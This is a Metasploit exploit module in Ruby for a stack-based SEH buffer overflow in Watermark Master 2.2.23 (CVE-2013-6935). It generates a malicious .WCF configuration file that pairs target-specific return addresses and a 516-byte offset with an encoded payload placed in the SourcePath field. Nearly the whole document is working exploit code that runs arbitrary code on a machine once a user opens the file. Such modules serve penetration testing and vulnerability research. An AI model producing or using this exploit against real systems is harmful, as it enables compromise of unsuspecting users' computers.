# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Seh

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;    => &#039;Watermark Master Buffer Overflow (SEH)&#039;,
      &#039;Description&#039;  => %q{
          This module exploits a stack based buffer overflow in Watermark Master 2.2.23 when
          processing a specially crafted .WCF file. This vulnerability could be
          exploited by a remote attacker to execute arbitrary code on the target
          machine by enticing a user of Watermark Master to open a malicious .WCF file.
      },
      &#039;License&#039;    => MSF_LICENSE,
      &#039;Author&#039;    =>
        [
          &#039;metacom&#039;,  # Original discovery
          &#039;Andrew Smith&#039;,  # MSF Module
        ],
      &#039;References&#039;  =>
        [
          [ &#039;OSVDB&#039;, &#039;99226&#039; ],
          [ &#039;CVE&#039;, &#039;2013-6935&#039;],
          [ &#039;EBD&#039;, &#039;29327&#039; ]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;EXITFUNC&#039; => &#039;process&#039;,
        },
      &#039;Platform&#039;  => &#039;win&#039;,
      &#039;Payload&#039;  =>
        {
          &#039;BadChars&#039; => "\x00\x0a\x0d\x3c\x22\x26",
          &#039;DisableNops&#039; => false,
          &#039;Space&#039; => 7276
        },

      &#039;Targets&#039;    =>
        [
          [ &#039;Windows 7 x32 - Watermark Master 2.2.23&#039;,
            {
              &#039;Ret&#039;     =>  0x10015f2d, #p/p/r | CommonClassesMFC.dll
              &#039;Offset&#039;  =>  516
            }
          ],
          [ &#039;Windows 7 x64 - Watermark Master 2.2.23&#039;,
            {
              &#039;Ret&#039;     =>  0x1001329a, #p/p/r | CommonClassesMFC.dll
              &#039;Offset&#039;  =>  516
            }
          ],
        ],
      &#039;Privileged&#039;  => false,
      &#039;DisclosureDate&#039;  => &#039;Nov 1 2013&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options([OptString.new(&#039;FILENAME&#039;, [ false, &#039;The file name.&#039;, &#039;msf.wcf&#039;]),], self.class)

  end

  def exploit

    buffer = rand_text(target[&#039;Offset&#039;])
    buffer << generate_seh_record(target.ret)
    buffer << payload.encoded
    buffer << rand_text(18000 - buffer.length)

    file = %Q|<?xml version="1.0" encoding="Windows-1252" ?><config ver="2.2.23.00">
<cols name="Files"/>
<cols name="Profiles">
<Property name="Profile">
<cols name="Watermarks"/>
<cols name="Timelines"/>
<cols name="Streams">
<Property name="Stream">
<Value name="SourcePath" type="8" value="#{buffer}"/>
</Property>
</cols>
<cols name=""/>
</Property>
</cols>
</config>|

    print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
    file_create(file)

  end
end

